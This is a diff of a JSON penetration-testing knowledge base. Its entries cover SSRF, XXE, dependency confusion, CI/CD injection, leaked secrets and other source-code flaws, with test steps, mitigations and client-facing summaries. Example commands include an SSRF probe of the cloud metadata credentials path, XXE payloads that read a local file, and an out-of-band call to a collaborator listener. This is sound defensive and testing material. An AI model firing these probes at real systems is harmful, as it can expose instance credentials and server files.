+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1552",
+     "name": "Unsecured Credentials",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V14",
+     "name": "Data Protection"
+    }
+   ]
   },
   {
    "id": "SRC-033",
    "domain": "SRC",
-   "phase": 487,
    "title": "Server-Side Request Forgery (Source-Identified)",
    "sequence": 487,
    "severity": "high",
@@ -2277,7 +3201,8 @@
     "Locate every function performing a server-side HTTP(S) request based on caller-supplied input and confirm whether any destination-restriction logic (an allowlist, an internal-IP block) exists before the request is made.",
     "Build and run the application, then submit a request with the target-URL parameter pointing at a listener you control to confirm the server fetches it.",
     "Submit the same request with the target-URL parameter pointing at an internal/link-local address and observe the response for reflected content.",
-    "Test whether alternate URL schemes (`file://`, `gopher://`) are also accepted, indicating a broader SSRF primitive."
+    "Test whether alternate URL schemes (`file://`, `gopher://`) are also accepted, indicating a broader SSRF primitive.",
+    "Build the application and supply a server-side destination to the identified fetch to confirm the server connects to an internal target at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes SSRF testing against a running build of the reviewed application, including probing internal/link-local address ranges.",
@@ -2293,16 +3218,21 @@
     },
     {
      "label": "Confirm out-of-band request delivery via a controlled listener",
-     "command": "curl -s -X POST https://app.target.com/webhooks/register -H \"Authorization: Bearer <test-token>\" -d '{\"url\":\"http://<your-collaborator-id>.oastify.com/test\"}'"
+     "command": "curl -s -X POST https://<app>/webhooks/register -H \"Authorization: Bearer <test-token>\" -d '{\"url\":\"http://<your-collaborator-id>.oastify.com/test\"}'"
     },
     {
      "label": "Probe the cloud metadata service via the vulnerable parameter",
-     "command": "curl -s -X POST https://app.target.com/import -H \"Authorization: Bearer <test-token>\" -d '{\"sourceUrl\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'"
+     "command": "curl -s -X POST https://<app>/import -H \"Authorization: Bearer <test-token>\" -d '{\"sourceUrl\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'"
+    },
+    {
+     "label": "Search source for server-side fetches built from request input",
+     "command": "grep -rnE 'requests\\.get|urllib|fetch\\(|axios|HttpClient|curl_exec|file_get_contents' src/ -A2 | grep -iE 'req|request|param|url'"
     }
    ],
    "variants": [
     "Blind SSRF (confirmable only via out-of-band interaction) versus a variant reflecting fetched content directly in the response, enabling full internal-content disclosure.",
-    "Destination-restriction absent entirely versus present but bypassable via a DNS-rebinding attack against a hostname-only allowlist check that doesn't resolve and verify the actual destination IP."
+    "Destination-restriction absent entirely versus present but bypassable via a DNS-rebinding attack against a hostname-only allowlist check that doesn't resolve and verify the actual destination IP.",
+    "Forgery reaching the cloud metadata endpoint to obtain instance credentials, the high-impact case distinct from reaching an arbitrary external host."
    ],
    "mitigation": [
     "Restrict server-side URL-fetching functionality to an explicit allowlist of permitted schemes and destination hosts, rejecting any URL outside that allowlist.",
@@ -2310,6 +3240,7 @@
     "Resolve and verify the supplied URL's hostname to an IP address server-side before fetching, checking that resolved IP against the internal/link-local blocklist to prevent DNS-rebinding bypass.",
     "Use Instance Metadata Service v2 (IMDSv2) with a hop-limit restriction where cloud metadata access is genuinely needed by the application itself."
    ],
+   "mitigationClientFacing": "A review of your code found that the application fetches web addresses supplied in requests without restriction, letting an attacker point it at internal systems or the cloud platform's credential service — which in a cloud environment routinely yields working credentials. The fix is to restrict what the application may fetch to an approved list of destinations, block internal and cloud-internal addresses at the network level, and re-check after any redirect. This is potentially critical because of the credential exposure, so both the code fix and the network controls should be addressed, and the corrected behaviour confirmed on the running system.",
    "reference": {
     "standard": "A10:2021 - Server-Side Request Forgery",
     "cwe": "CWE-918",
@@ -2328,12 +3259,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1090",
+     "name": "Proxy",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V4",
+     "name": "API and Web Service"
+    }
+   ]
   },
   {
    "id": "SRC-034",
    "domain": "SRC",
-   "phase": 488,
    "title": "Use of Vulnerable Dependency",
    "sequence": 488,
    "severity": "high",
@@ -2347,7 +3299,9 @@
     "Run a software-composition-analysis scan against the application's dependency manifest/lock file.",
     "Review the resulting CVE findings, prioritizing Critical/High severity issues with a known public exploit.",
     "For each Critical/High finding, review the application's actual usage of the affected library/function to assess whether the vulnerable code path is genuinely reachable.",
-    "Cross-reference the dependency's pinned version against its current, actively-maintained release to quantify how far behind the integration has drifted."
+    "Cross-reference the dependency's pinned version against its current, actively-maintained release to quantify how far behind the integration has drifted.",
+    "Confirm whether the vulnerable dependency's affected code path is actually reachable from the application, since a vulnerability in an unused function is a lower priority.",
+    "Build the application against the dependency manifest and confirm the resolved version is the vulnerable one rather than a patched transitive override."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes dependency scanning and, where a specific reachable CVE is identified, exploitation testing against a running build of the reviewed application.",
@@ -2368,11 +3322,16 @@
     {
      "label": "Cross-reference a specific flagged library version against its current release",
      "command": "npm view <library-name> versions --json | tail -5"
+    },
+    {
+     "label": "Enumerate declared dependencies and flag versions with known advisories",
+     "command": "# run a dependency audit against the manifest and list components with published advisories"
     }
    ],
    "variants": [
     "Vulnerable dependency present but its vulnerable code path not actually reachable by the application's specific usage pattern (lower practical risk) versus one actively invoked in the application's core functionality.",
-    "Vulnerability introduced via a direct dependency versus a transitive (indirect) dependency, requiring dependency-tree-level scanning rather than only checking directly-declared libraries."
+    "Vulnerability introduced via a direct dependency versus a transitive (indirect) dependency, requiring dependency-tree-level scanning rather than only checking directly-declared libraries.",
+    "A vulnerable component reachable only through a development or build-time path rather than the running application, which lowers but does not remove the risk."
    ],
    "mitigation": [
     "Establish a recurring dependency-audit process (ideally automated via CI/CD-integrated SCA scanning) to catch newly-disclosed CVEs against dependencies promptly.",
@@ -2380,6 +3339,7 @@
     "Where a specific dependency has a poor security-maintenance track record, evaluate replacing it with a better-maintained alternative.",
     "Maintain a software bill of materials (SBOM) for the application's dependencies to make future vulnerability cross-referencing faster and more reliable."
    ],
+   "mitigationClientFacing": "Your application depends on a third-party component with a known, published security flaw for which a fix is available. Attackers look for exactly these, because the weakness is documented and reliable. The fix is to update the component to a patched version and to make dependency scanning a routine part of your build so outdated components are caught before release. Prioritise by whether the vulnerable functionality is actually reachable from your application — a flaw in an unused function is lower risk than one on a live path — while still planning to update the rest. Confirm the resolved version on the built application.",
    "reference": {
     "standard": "A06:2021 - Vulnerable and Outdated Components",
     "cwe": "CWE-1104",
@@ -2399,12 +3359,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CONF",
+     "name": "Configuration and Deployment Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
   },
   {
    "id": "SRC-035",
    "domain": "SRC",
-   "phase": 489,
    "title": "XML External Entity (Source-Identified)",
    "sequence": 489,
    "severity": "high",
@@ -2418,7 +3399,8 @@
     "Locate every XML-parsing call site handling caller-supplied input, and confirm the parser's configuration explicitly disables DOCTYPE declarations, external entity resolution, and external DTD loading.",
     "Where the parser configuration is default/unconfigured for these settings, treat this as a strong indicator of vulnerability pending runtime confirmation.",
     "Build and run the application, then submit a crafted XML payload containing an external entity referencing a benign, verifiable local file or an out-of-band listener.",
-    "Confirm whether the response reflects the referenced file's content, or whether an out-of-band request is received, proving the entity was resolved."
+    "Confirm whether the response reflects the referenced file's content, or whether an out-of-band request is received, proving the entity was resolved.",
+    "Build the application and submit an XML document declaring an external entity to confirm the parser resolves it at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes XXE testing against a running build of the reviewed application's XML-parsing endpoint.",
@@ -2434,16 +3416,21 @@
     },
     {
      "label": "Craft an XXE payload to read a benign local test file",
-     "command": "curl -s -X POST https://app.target.com/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><data>&xxe;</data>'"
+     "command": "curl -s -X POST https://<app>/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><data>&xxe;</data>'"
     },
     {
      "label": "Craft an out-of-band XXE confirmation payload",
-     "command": "curl -s -X POST https://app.target.com/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://<your-collaborator-id>.oastify.com/xxe-confirmed\">]><data>&xxe;</data>'"
+     "command": "curl -s -X POST https://<app>/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://<your-collaborator-id>.oastify.com/xxe-confirmed\">]><data>&xxe;</data>'"
+    },
+    {
+     "label": "Search source for XML parsing without external-entity resolution disabled",
+     "command": "grep -rnE 'DocumentBuilder|SAXParser|XMLReader|etree\\.parse|libxml|simplexml_load' src/"
     }
    ],
    "variants": [
     "Classic file-read XXE via a `file://` entity versus SSRF-via-XXE via an entity referencing an internal/cloud-metadata URL.",
-    "XXE reachable via a directly-accepted XML endpoint versus via a file-format that embeds XML internally (SVG, DOCX/XLSX's underlying XML structure, a SOAP request body) that isn't obviously an \"XML endpoint\" on its surface."
+    "XXE reachable via a directly-accepted XML endpoint versus via a file-format that embeds XML internally (SVG, DOCX/XLSX's underlying XML structure, a SOAP request body) that isn't obviously an \"XML endpoint\" on its surface.",
+    "Entity resolution reaching an internal URL rather than a local file, turning the flaw into server-side request forgery in addition to file disclosure."
    ],
    "mitigation": [
     "Explicitly disable DOCTYPE declarations, external general entities, external parameter entities, and external DTD loading in every XML parser configuration used by the application, following the specific library's documented hardening guidance.",
@@ -2451,6 +3438,7 @@
     "Apply the same hardened parser configuration to any file format with an embedded XML structure (SVG uploads, Office Open XML documents), not just endpoints explicitly documented as \"XML APIs.\"",
     "Include an automated test submitting a benign XXE-probe payload against every XML-accepting endpoint in the CI pipeline, asserting the entity is not resolved."
    ],
+   "mitigationClientFacing": "A review of your code found XML processing that will resolve external references embedded in a document, which lets an attacker read files from the server or make it issue requests to internal systems simply by submitting a crafted XML document. The fix is to configure every XML parser to disable external-entity resolution, which closes this without affecting normal processing. Be aware the same flaw can reach internal web addresses as well as local files, extending it to request forgery. This is a well-understood, contained configuration change per parser, and the corrected behaviour should be confirmed on the running application.",
    "reference": {
     "standard": "A05:2021 - Security Misconfiguration",
     "cwe": "CWE-611",
@@ -2470,12 +3458,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A02",
+   "categoryName": "Security Misconfiguration",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
-   "id": "SRC-490",
+   "id": "SRC-036",
    "domain": "SRC",
-   "phase": 490,
    "sequence": 490,
    "title": "CI/CD Workflow Injection and Untrusted Pipeline Triggers",
    "severity": "critical",
@@ -2541,6 +3550,7 @@
     "Require review for pipeline definition changes to the same standard as application code.",
     "Prefer ephemeral runners, and never share a self-hosted runner between repositories with different trust levels."
    ],
+   "mitigationClientFacing": "A review of your build-and-deploy pipeline found that it can be made to run untrusted code — a proposed change, or externally-influenced input, reaching a step that executes with the pipeline's own access. Because pipelines hold credentials to deploy to production, this is a route from a low-trust contribution to high-trust access. The fix is to treat all externally-influenced input to the pipeline as untrusted, run untrusted contributions with minimal privilege and no access to production credentials, and separate the steps that build untrusted code from those that hold secrets. This warrants prompt attention, as it targets the path to production itself.",
    "reference": {
     "standard": "OWASP Top 10 CI/CD Security Risks",
     "cwe": "CWE-94",
@@ -2564,12 +3574,33 @@
     "attachments": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1059",
+     "name": "Command and Scripting Interpreter",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
-   "id": "SRC-491",
+   "id": "SRC-037",
    "domain": "SRC",
-   "phase": 491,
    "sequence": 491,
    "title": "Dependency Confusion and Lockfile Integrity Gaps",
    "severity": "high",
@@ -2635,6 +3666,7 @@
     "Disable install-time scripts by default and allowlist the few packages that genuinely require them.",
     "Verify integrity hashes on install and fail the build when a package does not match its recorded hash."
    ],
+   "mitigationClientFacing": "A review found that your dependency setup can be tricked into fetching an attacker's component instead of your intended one, because internally-named components could be satisfied by a public component of the same name, and the record that pins exact versions has gaps. This lets attacker code enter your build through the supply chain. The fix is to ensure internal components are always resolved from your private source and never from a public one of the same name, and to lock every dependency to an exact, verified version. This is a subtle but well-documented attack, and closing it protects the integrity of everything you build.",
    "reference": {
     "standard": "OWASP Top 10 - A06 Vulnerable and Outdated Components",
     "cwe": "CWE-1357",
@@ -2658,12 +3690,33 @@
     "attachments": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CONF",
+     "name": "Configuration and Deployment Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
   },
   {
-   "id": "SRC-492",
+   "id": "SRC-038",
    "domain": "SRC",
-   "phase": 492,
    "sequence": 492,
    "title": "Secrets Exposed in Version Control History",
    "severity": "critical",
@@ -2729,6 +3782,7 @@
     "Move all secrets to a secret store referenced at runtime, so there is nothing to commit.",
     "Treat any period of public exposure as full disclosure, since automated scanners find public secrets within minutes."
    ],
+   "mitigationClientFacing": "A review of your code's history found secrets — credentials, keys — that were committed in the past and remain recoverable from the version-control history, even if they were later removed from the current code. Anyone with access to the repository can retrieve them from the history. The fix is to rotate every exposed secret on the assumption it is already known — removal from history does not undo the exposure — and then to purge the secrets from the history and add scanning to prevent recurrence. Rotation is the urgent part; the history cleanup follows. Treat this in proportion to what the exposed secrets grant access to.",
    "reference": {
     "standard": "OWASP Top 10 - A07 Identification and Authentication Failures",
     "cwe": "CWE-540",
@@ -2753,12 +3807,33 @@
     "attachments": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1552",
+     "name": "Unsecured Credentials",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CONF",
+     "name": "Configuration and Deployment Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V14",
+     "name": "Data Protection"
+    }
+   ]
   },
   {
-   "id": "SRC-493",
+   "id": "SRC-039",
    "domain": "SRC",
-   "phase": 493,
    "sequence": 493,
    "title": "Prototype Pollution in JavaScript Object Handling",
    "severity": "high",
@@ -2824,6 +3899,7 @@
     "Prefer Map over plain objects for user-controlled key-value data.",
     "Keep dependencies current and scan for known prototype pollution advisories, since the vulnerable merge is often not your own code."
    ],
+   "mitigationClientFacing": "A review of your JavaScript found a flaw where specially-crafted input can alter the behaviour of objects across the application by polluting a shared underlying structure, which can lead to a range of consequences from denial of service to, in some setups, code execution. The fix is to handle incoming data so that it cannot reach and modify these shared object internals — validating keys and using safe data structures for untrusted input. This is a JavaScript-specific class of flaw that can have broad and surprising effects, so the identified paths should be corrected and confirmed on the running application.",
    "reference": {
     "standard": "OWASP Top 10 - A03 Injection",
     "cwe": "CWE-1321",
@@ -2848,12 +3924,33 @@
     "attachments": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1059",
+     "name": "Command and Scripting Interpreter",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
-   "id": "SRC-494",
+   "id": "SRC-040",
    "domain": "SRC",
-   "phase": 494,
    "sequence": 494,
    "title": "Disabled TLS Certificate Validation in Source",
    "severity": "critical",
@@ -2919,6 +4016,7 @@
     "Use properly issued certificates in development and test environments, removing the reason the workaround is reached for.",
     "Test outbound connections against an untrusted certificate as part of release testing, since the failure is otherwise silent."
    ],
+   "mitigationClientFacing": "A review of your code found that the verification of encryption certificates has been switched off, so the application does not confirm it is talking to the genuine server and will accept an impostor — which lets an attacker on the network intercept and alter supposedly-secure traffic. This is often done during development and mistakenly left in production. The fix is to enable full certificate validation everywhere and remove any code that disables it. This defeats the entire purpose of the encrypted connection while leaving it looking secure, so it warrants prompt attention and confirmation that validation is active on the running application.",
    "reference": {
     "standard": "OWASP Top 10 - A02 Cryptographic Failures",
     "cwe": "CWE-295",
@@ -2943,12 +4041,33 @@
     "attachments": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A04",
+   "categoryName": "Cryptographic Failures",
+   "attack": [
+    {
+     "id": "T1557",
+     "name": "Adversary-in-the-Middle",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CRYP",
+     "name": "Cryptography"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V12",
+     "name": "Secure Communication"
+    }
+   ]
   },
   {
-   "id": "SRC-495",
+   "id": "SRC-041",
    "domain": "SRC",
-   "phase": 495,
    "sequence": 495,
    "title": "Missing Tenant Predicate in Multi-Tenant Query Construction",
    "severity": "critical",
@@ -3014,6 +4133,7 @@
     "Include the tenant identifier in every cache key and search index filter.",
     "Test cross-tenant isolation with seeded marker data as a standing part of release testing, since one new query reintroduces the risk."
    ],
+   "mitigationClientFacing": "A review of your multi-tenant application found database queries that omit the filter restricting results to the current customer, so one customer's request can return another customer's data. In a shared-database design, that per-customer filter is the boundary between tenants, and a single query missing it is a direct cross-customer exposure. The fix is to enforce the tenant filter on every query — ideally through a shared mechanism that cannot be forgotten rather than relying on each query to include it. Given the contractual and regulatory weight of a cross-customer disclosure, this warrants prompt attention and confirmation across every data-access path.",
    "reference": {
     "standard": "OWASP Top 10 - A01 Broken Access Control",
     "cwe": "CWE-639",
@@ -3037,7 +4157,29 @@
     "attachments": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1213",
+     "name": "Data from Information Repositories",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V8",
+     "name": "Authorization"
+    }
+   ]
   }
  ]
 }
